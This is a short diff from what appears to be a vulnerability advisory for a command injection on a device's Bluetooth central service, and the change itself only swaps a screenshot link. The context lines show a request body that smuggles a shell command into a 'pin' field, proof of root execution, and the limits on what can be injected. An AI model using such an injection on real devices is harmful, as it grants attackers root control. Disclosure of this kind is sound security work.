@@ -42,7 +42,7 @@ CVSS:3.1/AV:A/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H (6.8)
 
 Request body {"pin":"x$(id)y"}; device process list captured: run_central.sh -s xuid=0(root) gid=0(root)y. Constraints: no literal ")" or single quote in the injected command; the BT central is single-instance.
 
-PoC script: [poc.py](poc.py) - Screenshot: [screenshot.md](screenshot.md) (replace with screenshot.png)
+PoC script: [poc.py](poc.py) - Screenshot: [screenshot.png](screenshot.png)
 
 ### Description
 
